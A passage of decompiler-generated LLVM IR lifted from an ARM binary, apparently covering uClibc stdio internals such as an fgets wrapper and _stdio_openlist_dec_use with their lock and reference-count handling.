  %v2_1c8dc = inttoptr i32 %v1_1c8dc to i32*
  %v3_1c8dc = load i32, i32* %v2_1c8dc, align 4
  store i32 %v3_1c8dc, i32* %r3.global-to-local, align 4
  %v1_1c8e0 = add i32 %v0_1c8d8, -1168
  store i32 %v1_1c8e0, i32* @r8, align 4
  %v3_1c8e4 = icmp uge i32 %v3_1c8dc, %v1_1c8e0
  store i1 %v3_1c8e4, i1* %cpsr_c.global-to-local, align 1
  %v9_1c8e4 = icmp eq i32 %v3_1c8dc, %v1_1c8e0
  br i1 %v9_1c8e4, label %dec_label_pc_1c930, label %dec_label_pc_1c8ec

dec_label_pc_1c8ec:                               ; preds = %dec_label_pc_1c8d8
  %v1_1c8ec = add i32 %arg3, 56
  store i32 %v1_1c8ec, i32* @r5, align 4
  store i32 %v1_1c8ec, i32* %r2.global-to-local, align 4
  %v0_1c8f8 = load i32, i32* @r6, align 4
  store i32 %v0_1c8f8, i32* @r4, align 4
  %v1_1c8fc36 = inttoptr i32 %v1_1c8ec to i32*
  %v2_1c8fc37 = load i32, i32* %v1_1c8fc36, align 4
  store i32 %v2_1c8fc37, i32* %r3.global-to-local, align 4
  %v3_1c90039 = icmp uge i32 %v2_1c8fc37, %v0_1c8f8
  store i1 %v3_1c90039, i1* %cpsr_c.global-to-local, align 1
  %v9_1c90045 = icmp eq i32 %v2_1c8fc37, %v0_1c8f8
  br i1 %v9_1c90045, label %dec_label_pc_1c908, label %dec_label_pc_1c920

dec_label_pc_1c908:                               ; preds = %dec_label_pc_1c8ec, %dec_label_pc_1c908.dec_label_pc_1c8fc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1c918 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1c918, label %dec_label_pc_1c91c, label %dec_label_pc_1c908.dec_label_pc_1c8fc_crit_edge

dec_label_pc_1c908.dec_label_pc_1c8fc_crit_edge:  ; preds = %dec_label_pc_1c908
  %v0_1c8fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1c900.pre = load i32, i32* @r4, align 4
  %v1_1c8fc = inttoptr i32 %v0_1c8fc.pre to i32*
  %v2_1c8fc = load i32, i32* %v1_1c8fc, align 4
  store i32 %v2_1c8fc, i32* %r3.global-to-local, align 4
  %v3_1c900 = icmp uge i32 %v2_1c8fc, %v1_1c900.pre
  store i1 %v3_1c900, i1* %cpsr_c.global-to-local, align 1
  %v9_1c900 = icmp eq i32 %v2_1c8fc, %v1_1c900.pre
  br i1 %v9_1c900, label %dec_label_pc_1c908, label %dec_label_pc_1c920

dec_label_pc_1c91c:                               ; preds = %dec_label_pc_1c908
  %v0_1c91c = load i32, i32* @r4, align 4
  store i32 %v0_1c91c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c920

dec_label_pc_1c920:                               ; preds = %dec_label_pc_1c8ec, %dec_label_pc_1c908.dec_label_pc_1c8fc_crit_edge, %dec_label_pc_1c91c
  %v0_1c920 = phi i32 [ %v0_1c91c, %dec_label_pc_1c91c ], [ %v2_1c8fc37, %dec_label_pc_1c8ec ], [ %v2_1c8fc, %dec_label_pc_1c908.dec_label_pc_1c8fc_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c920 = icmp eq i32 %v0_1c920, 0
  br i1 %v2_1c920, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_1c920
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1c920, %bb
  store i32 117036, i32* @lr, align 4
  %v1_1c928 = xor i1 %v2_1c920, true
  call void @__pseudo_cond_branch(i1 %v1_1c928, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1c92c = load i32, i32* @r8, align 4
  %v1_1c92c = load i32, i32* @r7, align 4
  %v2_1c92c = add i32 %v1_1c92c, 64
  %v3_1c92c = inttoptr i32 %v2_1c92c to i32*
  store i32 %v0_1c92c, i32* %v3_1c92c, align 4
  br label %dec_label_pc_1c930

dec_label_pc_1c930:                               ; preds = %dec_label_pc_1c8d8, %bb20
  %v0_1c930 = load i32, i32* @r7, align 4
  %v1_1c930 = add i32 %v0_1c930, 60
  %v2_1c930 = inttoptr i32 %v1_1c930 to i32*
  %v3_1c930 = load i32, i32* %v2_1c930, align 4
  %v1_1c934 = add i32 %v3_1c930, 1
  store i32 %v1_1c934, i32* %r3.global-to-local, align 4
  store i32 %v1_1c934, i32* %v2_1c930, align 4
  %v0_1c93c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1c940.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_1c944.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1c93c

dec_label_pc_1c93c:                               ; preds = %entry, %dec_label_pc_1c930
  %v0_1c944 = phi i32 [ %arg3, %entry ], [ %v0_1c944.pre, %dec_label_pc_1c930 ]
  %v0_1c940 = phi i32 [ %arg2, %entry ], [ %v0_1c940.pre, %dec_label_pc_1c930 ]
  %v0_1c93c = phi i32 [ %arg1, %entry ], [ %v0_1c93c.pre, %dec_label_pc_1c930 ]
  store i32 %v0_1c944, i32* %r2.global-to-local, align 4
  %v3_1c948 = inttoptr i32 %v0_1c93c to i8*
  %v4_1c948 = call i32 @__GI_fgets_unlocked(i8* %v3_1c948, i32 %v0_1c940, i32 %v0_1c944)
  %v0_1c94c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c94c = icmp eq i32 %v0_1c94c, 0
  store i32 %v4_1c948, i32* %r8.global-to-local, align 4
  br i1 %v2_1c94c, label %dec_label_pc_1c958, label %dec_label_pc_1c9cc

dec_label_pc_1c958:                               ; preds = %dec_label_pc_1c93c
  %v0_1c958 = load i32, i32* @r7, align 4
  %v1_1c958 = add i32 %v0_1c958, 60
  %v2_1c958 = inttoptr i32 %v1_1c958 to i32*
  %v3_1c958 = load i32, i32* %v2_1c958, align 4
  %v1_1c95c = add i32 %v3_1c958, -1
  store i32 %v1_1c95c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c960 = icmp eq i32 %v1_1c95c, 0
  store i32 %v1_1c95c, i32* %v2_1c958, align 4
  br i1 %v2_1c960, label %dec_label_pc_1c96c, label %dec_label_pc_1c9cc

dec_label_pc_1c96c:                               ; preds = %dec_label_pc_1c958
  %v0_1c96c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c96c = load i32, i32* @r7, align 4
  %v2_1c96c = add i32 %v1_1c96c, 64
  %v3_1c96c = inttoptr i32 %v2_1c96c to i32*
  store i32 %v0_1c96c, i32* %v3_1c96c, align 4
  %v0_1c970 = load i32, i32* @r7, align 4
  %v1_1c970 = add i32 %v0_1c970, 56
  store i32 %v1_1c970, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1c974

dec_label_pc_1c974:                               ; preds = %dec_label_pc_1c9a4.dec_label_pc_1c974_crit_edge, %dec_label_pc_1c96c
  %v0_1c97c = phi i32 [ %v0_1c97c.pre, %dec_label_pc_1c9a4.dec_label_pc_1c974_crit_edge ], [ %v1_1c970, %dec_label_pc_1c96c ]
  %v0_1c974 = phi i32 [ %v0_1c974.pre, %dec_label_pc_1c9a4.dec_label_pc_1c974_crit_edge ], [ %v0_1c970, %dec_label_pc_1c96c ]
  %v1_1c974 = add i32 %v0_1c974, 56
  %v2_1c974 = inttoptr i32 %v1_1c974 to i32*
  %v3_1c974 = load i32, i32* %v2_1c974, align 4
  store i32 %v3_1c974, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1c97c, i32* %r2.global-to-local, align 4
  %v1_1c98024 = inttoptr i32 %v0_1c97c to i32*
  %v2_1c98025 = load i32, i32* %v1_1c98024, align 4
  store i32 %v2_1c98025, i32* %r3.global-to-local, align 4
  %v3_1c98427 = icmp uge i32 %v2_1c98025, %v3_1c974
  store i1 %v3_1c98427, i1* %cpsr_c.global-to-local, align 1
  %v9_1c98433 = icmp eq i32 %v2_1c98025, %v3_1c974
  br i1 %v9_1c98433, label %dec_label_pc_1c98c, label %dec_label_pc_1c9a4

dec_label_pc_1c98c:                               ; preds = %dec_label_pc_1c974, %dec_label_pc_1c98c.dec_label_pc_1c980_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1c99c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1c99c, label %dec_label_pc_1c9a0, label %dec_label_pc_1c98c.dec_label_pc_1c980_crit_edge

dec_label_pc_1c98c.dec_label_pc_1c980_crit_edge:  ; preds = %dec_label_pc_1c98c
  %v0_1c980.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1c984.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1c980 = inttoptr i32 %v0_1c980.pre to i32*
  %v2_1c980 = load i32, i32* %v1_1c980, align 4
  store i32 %v2_1c980, i32* %r3.global-to-local, align 4
  %v3_1c984 = icmp uge i32 %v2_1c980, %v1_1c984.pre
  store i1 %v3_1c984, i1* %cpsr_c.global-to-local, align 1
  %v9_1c984 = icmp eq i32 %v2_1c980, %v1_1c984.pre
  br i1 %v9_1c984, label %dec_label_pc_1c98c, label %dec_label_pc_1c9a4

dec_label_pc_1c9a0:                               ; preds = %dec_label_pc_1c98c
  %v0_1c9a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1c9a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c9a4

dec_label_pc_1c9a4:                               ; preds = %dec_label_pc_1c974, %dec_label_pc_1c98c.dec_label_pc_1c980_crit_edge, %dec_label_pc_1c9a0
  %v0_1c9ac = phi i32 [ %v0_1c9a0, %dec_label_pc_1c9a0 ], [ %v2_1c98025, %dec_label_pc_1c974 ], [ %v2_1c980, %dec_label_pc_1c98c.dec_label_pc_1c980_crit_edge ]
  %v1_1c9a4 = phi i32 [ %v0_1c9a0, %dec_label_pc_1c9a0 ], [ %v3_1c974, %dec_label_pc_1c974 ], [ %v1_1c984.pre, %dec_label_pc_1c98c.dec_label_pc_1c980_crit_edge ]
  %v3_1c9a4 = icmp uge i32 %v0_1c9ac, %v1_1c9a4
  store i1 %v3_1c9a4, i1* %cpsr_c.global-to-local, align 1
  %v9_1c9a4 = icmp eq i32 %v0_1c9ac, %v1_1c9a4
  br i1 %v9_1c9a4, label %dec_label_pc_1c9ac, label %dec_label_pc_1c9a4.dec_label_pc_1c974_crit_edge

dec_label_pc_1c9a4.dec_label_pc_1c974_crit_edge:  ; preds = %dec_label_pc_1c9a4
  %v0_1c974.pre = load i32, i32* @r7, align 4
  %v0_1c97c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1c974

dec_label_pc_1c9ac:                               ; preds = %dec_label_pc_1c9a4
  %v2_1c9ac = icmp ne i32 %v1_1c9a4, 0
  store i1 %v2_1c9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_1c9b0 = icmp slt i32 %v1_1c9a4, 2
  br i1 %v7_1c9b0, label %dec_label_pc_1c9cc, label %dec_label_pc_1c9b4

dec_label_pc_1c9b4:                               ; preds = %dec_label_pc_1c9ac
  %v0_1c9b8 = load i32, i32* @r1, align 4
  %v1_1c9b8 = add i32 %v0_1c9b8, 129
  store i32 %v1_1c9b8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c9cc

dec_label_pc_1c9cc:                               ; preds = %dec_label_pc_1c958, %dec_label_pc_1c93c, %dec_label_pc_1c9b4, %dec_label_pc_1c9ac
  %v0_1c9cc = load i32, i32* %r8.global-to-local, align 4
  %v2_1c9d0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1c9d0, i32* @r4, align 4
  store i32 %v6_1c8bc, i32* @r5, align 4
  store i32 %v9_1c8bc, i32* @r6, align 4
  store i32 %v12_1c8bc, i32* @r7, align 4
  store i32 %v15_1c8bc, i32* @r8, align 4
  store i32 %v24_1c8bc, i32* @lr, align 4
  ret i32 %v0_1c9cc

; uselistorder directives
  uselistorder i32 %v0_1c9a0, { 1, 0, 2 }
  uselistorder i32 %v1_1c984.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1c944, { 1, 0 }
  uselistorder i32 %v1_1c900.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_1c9cc, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1c9a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c98c, { 1, 0 }
  uselistorder label %dec_label_pc_1c93c, { 1, 0 }
  uselistorder label %dec_label_pc_1c930, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1c920, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c908, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1c9d8 = load i32, i32* @r4, align 4
  store i32 %v3_1c9d8, i32* %stack_var_-20, align 4
  store i32 176, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r5.global-to-local, align 4
  %v4_1c9e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 176) to i32*), align 4
  store i32 %v4_1c9e8, i32* %r7.global-to-local, align 4
  %v0_1c9ec = call i32 @__aeabi_read_tp()
  store i32 %v0_1c9ec, i32* %r0.global-to-local, align 4
  %v1_1c9f0 = add i32 %v4_1c9e8, 8
  %v2_1c9f0 = inttoptr i32 %v1_1c9f0 to i32*
  %v3_1c9f0 = load i32, i32* %v2_1c9f0, align 4
  store i32 %v3_1c9f0, i32* %r3.global-to-local, align 4
  %v1_1c9f4 = add i32 %v0_1c9ec, -1168
  store i32 %v1_1c9f4, i32* %r6.global-to-local, align 4
  %v3_1c9f8 = icmp uge i32 %v3_1c9f0, %v1_1c9f4
  store i1 %v3_1c9f8, i1* %cpsr_c.global-to-local, align 1
  %v9_1c9f8 = icmp eq i32 %v3_1c9f0, %v1_1c9f4
  br i1 %v9_1c9f8, label %dec_label_pc_1ca44, label %dec_label_pc_1ca04

dec_label_pc_1ca04:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1c9e8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1ca1093 = inttoptr i32 %v4_1c9e8 to i32*
  %v2_1ca1094 = load i32, i32* %v1_1ca1093, align 4
  store i32 %v2_1ca1094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1ca1496 = icmp eq i32 %v2_1ca1094, 0
  br i1 %v9_1ca1496, label %dec_label_pc_1ca1c, label %dec_label_pc_1ca34

dec_label_pc_1ca1c:                               ; preds = %dec_label_pc_1ca04, %dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge
  %v0_1ca1c97 = phi i32 [ %v1_1ca14.pre, %dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge ], [ 0, %dec_label_pc_1ca04 ]
  store i32 %v0_1ca1c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1ca2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1ca2c, label %dec_label_pc_1ca30, label %dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge

dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge:  ; preds = %dec_label_pc_1ca1c
  %v0_1ca10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ca14.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1ca10 = inttoptr i32 %v0_1ca10.pre to i32*
  %v2_1ca10 = load i32, i32* %v1_1ca10, align 4
  store i32 %v2_1ca10, i32* %r3.global-to-local, align 4
  %v3_1ca14 = icmp uge i32 %v2_1ca10, %v1_1ca14.pre
  store i1 %v3_1ca14, i1* %cpsr_c.global-to-local, align 1
  %v9_1ca14 = icmp eq i32 %v2_1ca10, %v1_1ca14.pre
  br i1 %v9_1ca14, label %dec_label_pc_1ca1c, label %dec_label_pc_1ca34

dec_label_pc_1ca30:                               ; preds = %dec_label_pc_1ca1c
  %v0_1ca30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1ca30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ca34

dec_label_pc_1ca34:                               ; preds = %dec_label_pc_1ca04, %dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge, %dec_label_pc_1ca30
  %v0_1ca34 = phi i32 [ %v0_1ca30, %dec_label_pc_1ca30 ], [ %v2_1ca1094, %dec_label_pc_1ca04 ], [ %v2_1ca10, %dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge ]
  %v1_1ca34 = phi i32 [ %v0_1ca30, %dec_label_pc_1ca30 ], [ 0, %dec_label_pc_1ca04 ], [ %v1_1ca14.pre, %dec_label_pc_1ca1c.dec_label_pc_1ca10_crit_edge ]
  %v3_1ca34 = icmp uge i32 %v0_1ca34, %v1_1ca34
  store i1 %v3_1ca34, i1* %cpsr_c.global-to-local, align 1
  %v9_1ca34 = icmp eq i32 %v0_1ca34, %v1_1ca34
  br i1 %v9_1ca34, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_1ca34
  %v1_1ca38 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1ca38, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1ca34, %bb
  %v1_1ca3c = xor i1 %v9_1ca34, true
  call void @__pseudo_cond_branch(i1 %v1_1ca3c, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1ca40 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ca40 = load i32, i32* %r7.global-to-local, align 4
  %v2_1ca40 = add i32 %v1_1ca40, 8
  %v3_1ca40 = inttoptr i32 %v2_1ca40 to i32*
  store i32 %v0_1ca40, i32* %v3_1ca40, align 4
  br label %dec_label_pc_1ca44

dec_label_pc_1ca44:                               ; preds = %entry, %bb45
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1ca48 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ca48 = add i32 %v0_1ca48, 176
  %v3_1ca48 = inttoptr i32 %v2_1ca48 to i32*
  %v4_1ca48 = load i32, i32* %v3_1ca48, align 4
  store i32 %v4_1ca48, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1ca50 = add i32 %v0_1ca48, 12
  %v3_1ca50 = inttoptr i32 %v2_1ca50 to i32*
  %v4_1ca50 = load i32, i32* %v3_1ca50, align 4
  store i32 %v4_1ca50, i32* %r3.global-to-local, align 4
  %v1_1ca54 = inttoptr i32 %v4_1ca50 to i32*
  %v2_1ca54 = load i32, i32* %v1_1ca54, align 4
  store i32 %v2_1ca54, i32* %r1.global-to-local, align 4
  %v1_1ca58 = add i32 %v4_1ca48, 4
  %v2_1ca58 = inttoptr i32 %v1_1ca58 to i32*
  %v3_1ca58 = load i32, i32* %v2_1ca58, align 4
  %v2_1ca5c = icmp ne i32 %v2_1ca54, 0
  store i1 %v2_1ca5c, i1* %cpsr_c.global-to-local, align 1
  %v7_1ca5c = icmp eq i32 %v2_1ca54, 1
  %v1_1ca60 = add i32 %v3_1ca58, 1
  store i32 %v1_1ca60, i32* %r3.global-to-local, align 4
  store i32 %v1_1ca60, i32* %v2_1ca58, align 4
  br i1 %v7_1ca5c, label %dec_label_pc_1ca6c, label %dec_label_pc_1cbd0

dec_label_pc_1ca6c:                               ; preds = %dec_label_pc_1ca44
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_1ca70 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ca70 = add i32 %v0_1ca70, 92
  %v3_1ca70 = inttoptr i32 %v2_1ca70 to i32*
  %v4_1ca70 = load i32, i32* %v3_1ca70, align 4
  store i32 %v4_1ca70, i32* %r3.global-to-local, align 4
  %v1_1ca74 = inttoptr i32 %v4_1ca70 to i32*
  %v2_1ca74 = load i32, i32* %v1_1ca74, align 4
  store i32 %v2_1ca74, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_1ca74, 1
  br i1 %tmp46, label %dec_label_pc_1cbd0, label %dec_label_pc_1ca80

dec_label_pc_1ca80:                               ; preds = %dec_label_pc_1ca6c
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_1ca84 = add i32 %v0_1ca70, 168
  %v3_1ca84 = inttoptr i32 %v2_1ca84 to i32*
  %v4_1ca84 = load i32, i32* %v3_1ca84, align 4
  store i32 %v4_1ca84, i32* %r7.global-to-local, align 4
  %v1_1ca88 = add i32 %v4_1ca84, 8
  %v2_1ca88 = inttoptr i32 %v1_1ca88 to i32*
  %v3_1ca88 = load i32, i32* %v2_1ca88, align 4
  store i32 %v3_1ca88, i32* %r3.global-to-local, align 4
  %v1_1ca8c = load i32, i32* %r6.global-to-local, align 4
  %v3_1ca8c = icmp uge i32 %v3_1ca88, %v1_1ca8c
  store i1 %v3_1ca8c, i1* %cpsr_c.global-to-local, align 1
  %v9_1ca8c = icmp eq i32 %v3_1ca88, %v1_1ca8c
  br i1 %v9_1ca8c, label %dec_label_pc_1cad0, label %dec_label_pc_1ca94

dec_label_pc_1ca94:                               ; preds = %dec_label_pc_1ca80
  store i32 %v4_1ca84, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1ca9c86 = inttoptr i32 %v4_1ca84 to i32*
  %v2_1ca9c87 = load i32, i32* %v1_1ca9c86, align 4
  store i32 %v2_1ca9c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1caa089 = icmp eq i32 %v2_1ca9c87, 0
  br i1 %v9_1caa089, label %dec_label_pc_1caa8, label %dec_label_pc_1cac0

dec_label_pc_1caa8:                               ; preds = %dec_label_pc_1ca94, %dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge
  %v0_1caa890 = phi i32 [ %v1_1caa0.pre, %dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge ], [ 0, %dec_label_pc_1ca94 ]
  store i32 %v0_1caa890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cab8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cab8, label %dec_label_pc_1cabc, label %dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge

dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge:  ; preds = %dec_label_pc_1caa8
  %v0_1ca9c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1caa0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1ca9c = inttoptr i32 %v0_1ca9c.pre to i32*
  %v2_1ca9c = load i32, i32* %v1_1ca9c, align 4
  store i32 %v2_1ca9c, i32* %r3.global-to-local, align 4
  %v3_1caa0 = icmp uge i32 %v2_1ca9c, %v1_1caa0.pre
  store i1 %v3_1caa0, i1* %cpsr_c.global-to-local, align 1
  %v9_1caa0 = icmp eq i32 %v2_1ca9c, %v1_1caa0.pre
  br i1 %v9_1caa0, label %dec_label_pc_1caa8, label %dec_label_pc_1cac0

dec_label_pc_1cabc:                               ; preds = %dec_label_pc_1caa8
  %v0_1cabc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1cabc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cac0

dec_label_pc_1cac0:                               ; preds = %dec_label_pc_1ca94, %dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge, %dec_label_pc_1cabc
  %v0_1cac0 = phi i32 [ %v0_1cabc, %dec_label_pc_1cabc ], [ %v2_1ca9c87, %dec_label_pc_1ca94 ], [ %v2_1ca9c, %dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge ]
  %v1_1cac0 = phi i32 [ %v0_1cabc, %dec_label_pc_1cabc ], [ 0, %dec_label_pc_1ca94 ], [ %v1_1caa0.pre, %dec_label_pc_1caa8.dec_label_pc_1ca9c_crit_edge ]
  %v3_1cac0 = icmp uge i32 %v0_1cac0, %v1_1cac0
  store i1 %v3_1cac0, i1* %cpsr_c.global-to-local, align 1
  %v9_1cac0 = icmp eq i32 %v0_1cac0, %v1_1cac0
  br i1 %v9_1cac0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_1cac0
  %v1_1cac4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1cac4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1cac0, %bb47
  %v1_1cac8 = xor i1 %v9_1cac0, true
  call void @__pseudo_cond_branch(i1 %v1_1cac8, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1cacc = load i32, i32* %r6.global-to-local, align 4
  %v1_1cacc = load i32, i32* %r7.global-to-local, align 4
  %v2_1cacc = add i32 %v1_1cacc, 8
  %v3_1cacc = inttoptr i32 %v2_1cacc to i32*
  store i32 %v0_1cacc, i32* %v3_1cacc, align 4
  %v0_1cad8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1cad0

dec_label_pc_1cad0:                               ; preds = %dec_label_pc_1ca80, %bb48
  %v0_1cad8 = phi i32 [ %v0_1ca70, %dec_label_pc_1ca80 ], [ %v0_1cad8.pre, %bb48 ]
  store i32 168, i32* %r3.global-to-local, align 4
  store i32 88, i32* %r1.global-to-local, align 4
  %v2_1cad8 = add i32 %v0_1cad8, 168
  %v3_1cad8 = inttoptr i32 %v2_1cad8 to i32*
  %v4_1cad8 = load i32, i32* %v3_1cad8, align 4
  store i32 %v4_1cad8, i32* %r0.global-to-local, align 4
  %v2_1cadc = add i32 %v0_1cad8, 88
  %v3_1cadc = inttoptr i32 %v2_1cadc to i32*
  %v4_1cadc = load i32, i32* %v3_1cadc, align 4
  store i32 %v4_1cadc, i32* %r2.global-to-local, align 4
  %v1_1cae0 = add i32 %v4_1cad8, 4
  %v2_1cae0 = inttoptr i32 %v1_1cae0 to i32*
  %v3_1cae0 = load i32, i32* %v2_1cae0, align 4
  store i32 %v3_1cae0, i32* %r3.global-to-local, align 4
  %v1_1cae4 = inttoptr i32 %v4_1cadc to i32*
  %v2_1cae4 = load i32, i32* %v1_1cae4, align 4
  store i32 %v2_1cae4, i32* %r2.global-to-local, align 4
  %v1_1cae8 = add i32 %v3_1cae0, 1
  store i32 %v1_1cae8, i32* %r3.global-to-local, align 4
  store i32 88, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_1cae8, i32* %v2_1cae0, align 4
  %v0_1cb38.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cb3811 = icmp eq i32 %v0_1cb38.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1cb3811, label %dec_label_pc_1cb44, label %dec_label_pc_1cafc

dec_label_pc_1cafc:                               ; preds = %dec_label_pc_1cad0, %dec_label_pc_1cb34
  %v0_1cb202 = phi i32 [ %v0_1cb34, %dec_label_pc_1cb34 ], [ %v0_1cb38.pr, %dec_label_pc_1cad0 ]
  %v1_1cafc = inttoptr i32 %v0_1cb202 to i16*
  %v2_1cafc = load i16, i16* %v1_1cafc, align 2
  %v3_1cafc = zext i16 %v2_1cafc to i32
  store i32 %v3_1cafc, i32* %r3.global-to-local, align 4
  %v2_1cb00 = and i32 %v3_1cafc, 32816
  store i32 %v2_1cb00, i32* %r1.global-to-local, align 4
  %v2_1cb04 = icmp ugt i32 %v2_1cb00, 47
  store i1 %v2_1cb04, i1* %cpsr_c.global-to-local, align 1
  %v7_1cb04 = icmp eq i32 %v2_1cb00, 48
  %v1_1cb08 = add i32 %v0_1cb202, 32
  %v2_1cb08 = inttoptr i32 %v1_1cb08 to i32*
  %v3_1cb08 = load i32, i32* %v2_1cb08, align 4
  store i32 %v3_1cb08, i32* %r4.global-to-local, align 4
  br i1 %v7_1cb04, label %dec_label_pc_1cb14, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1cafc
  store i32 %v0_1cb202, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1cb34

dec_label_pc_1cb14:                               ; preds = %dec_label_pc_1cafc
  %v0_1cb14 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cb14 = icmp eq i32 %v0_1cb14, 0
  br i1 %v2_1cb14, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_1cb14
  %v1_1cb18 = load i32, i32* %r5.global-to-local, align 4
